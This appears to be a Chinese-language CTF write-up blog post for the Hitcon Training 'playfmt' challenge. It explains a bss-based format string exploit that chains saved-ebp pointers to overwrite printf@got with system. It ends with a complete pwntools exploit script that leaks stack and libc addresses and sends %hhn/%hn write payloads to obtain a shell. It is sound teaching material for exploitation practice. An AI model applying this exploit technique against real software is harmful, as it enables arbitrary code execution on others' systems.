---
title: Hitcon Trainning playfmt
date: 2022-03-11 18:52:05
tags:
    - 格式化字符串
---

<!--more-->

# Hitcon Trainning playfmt

这是一道非常经典的一道非栈上格式化字符串漏洞利用

![image-20220311185922107](https://s2.loli.net/2022/03/26/C5zyedhRpcwraU8.png)

拿到程序可以看到主函数是读取buf的0xC8个数组，然后拿buf匹配“quit”如果不是就直接break,但是我们是需要pringf（）的。

## **想法：**

```
控制buf使其匹配“quit”,然后用system函数覆盖printf函数，直接发送/bin/sh
```

## **问题：**

```
buf是存在bss段上的，bss段我们是无法修改的。常规方法是利用栈上内容可写，将其写为某个地址，然后用%k$n这样的方式把这个地址指向的内容改掉。 而现在buf没法通过直接写入来控制栈上的地址。
```

![image-20220311190438174](https://s2.loli.net/2022/03/26/H45q1gMcNuatbBK.png)

## **解决办法：**

```
找到栈上哪些位置里面的内容是地址而且是可以控制栈上别的位置的内容的，以此来写入我们的目的地址，这个地方就是ebp，ebp本来就是用来保存之前的ebp的内容。因为只有像ebp这样的三个指针连接的依托指针才能做
```

![image-20220311192924478](https://s2.loli.net/2022/03/26/MDB3EhmnS4L7kl9.png)

因为这道题ebp上有两个指针，为了方便起见暂且称呼为指针a——>指针b——>指针c——>c的内容，只要我们控制指针c指向0xffffcf5c（指针a的下一个地址，简称指针d）并让它指向printf的got表地址并且打印出printf@got的内容，再改写printf@got为system的地址，接下来再调用printf就是调用system了。

## **补充：**

```
为什么要找指针d，因为指针d的地址和printf的got表地址很像，我们覆盖的时候只需覆盖两个字节就可以
```

![image-20220311194140294](https://s2.loli.net/2022/03/26/TbycsKdqaLe6571.png)

![image-20220311194058073](https://s2.loli.net/2022/03/26/l2zoJPBxcAhCukQ.png)

我们要覆盖地址的时候，要注意有一个问题，%k$n一用就炸，也就是说我们起码要用hn，并且在改写printf@got的时候，至少要把它分为两次写进去，那么我们就还要有一个地方指向printf@got+2，这个地址的要求和指针d是一样的。因为printf都是0x804带头，所以发现在偏移为b处的地址还有个是0x80485b1，刚好符合printf@got+2的要求

![image-20220311195139639](https://s2.loli.net/2022/03/26/3QloXxeu41L2Z6k.png)

##  **思路：**

![image-20220313114258003](https://s2.loli.net/2022/03/26/AHXByk8PbGLl9Kn.png)

先用“%6$p”泄露0xffffcf58指向的0xffffcf68的地址（stack），然后"%6$hhn"把0xffffcf5c覆盖0xfffffcf78,这样就变成0xffffcf58指向0xffffcf5c了，然后“%10$hn”把0xffffcf5c修改成printf.got值，后面同理修改printf.got+2（got表高位）的值（因为got表四字节，一下子写入4字节容易报错，所以分两次写入），再把system覆盖printf.got就行。

## EXP：

```
#!/usr/bin/env python 
#_*_ coding:utf-8 _*_ 
from pwn import *
context.log_level='debug'
sh=process('./playfmt')
elf=ELF('./playfmt')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

printf_got = elf.got['printf']
printf_libc = libc.symbols['printf']
system_libc = libc.symbols['system']
def b(addr):
    bk = "b *" + str(addr)
    gdb.attach(sh, bk)
    success("attach")
# b(0x804853B)
def check():
    sh.sendline('yes!')
    while True:
        sh.sendline('yes!')
        sleep(0.1)
        if sh.recv().find('yes!') != -1:
            break
'''
这里的一段借鉴网上大佬的，使用while，是因为%kc输出的实在太多了
recv()每次只能接受0x1000的内容
如果没有循环的话会卡住。
用一个标识符做接受完成标志
至于为什么这里每次都要sendline('yes!')
因为他可能前面的输出加上'ye'刚好就是0x100,后面就会因为只有's!'而没法跳出循环，就卡死了
'''
sh.sendline('aaaa%6$pbbbb%15$p')
sh.recvuntil('aaaa')
stack=int(sh.recv(10),16)
log.success("stack-->{}".format(hex(stack)))
sh.recvuntil('bbbb')
libc_base=int(sh.recv(10),16)+0x18fa1
log.success("libc_base-->{}".format(hex(libc_base)))
system_addr=system_libc+libc_base

stack1=stack-0xc
stack2=stack+0x4
log.success('stack1-->{}'.format(hex(stack1)))
log.success('stack2-->{}'.format(hex(stack2)))
b(0x804853B)
payload="%"+str((stack1)&0xff)+"c"+"%6$hhn"
sh.sendline(payload)
sleep(0.3)
check()
payload='%'+str((printf_got)&0xffff)+'c%10$hn'
sh.sendline(payload)
sleep(0.3)
check()
payload='%'+str((stack2)&0xff)+'c%6$hhn'
sh.sendline(payload)
sleep(0.3)
check()
payload='%'+str((printf_got+2)&0xffff)+'c%10$hn'
sh.sendline(payload)
sleep(0.3)
check()
#间接写入got表
payload='%'+str((system_addr>>16)&0xff)+'c%11$hhn'
payload+='%'+str((system_addr)&0xffff-((system_addr>>16)&0xff))+'c%7$hn'
#用sys函数覆盖got表，注意先写入sys高位地址，因为高地址是一字节，因为低地址是两个字节
sh.sendline(payload)
sh.sendline('quit')
# sh.sendline("/bin/sh")

sh.interactive()
sh.close()
```

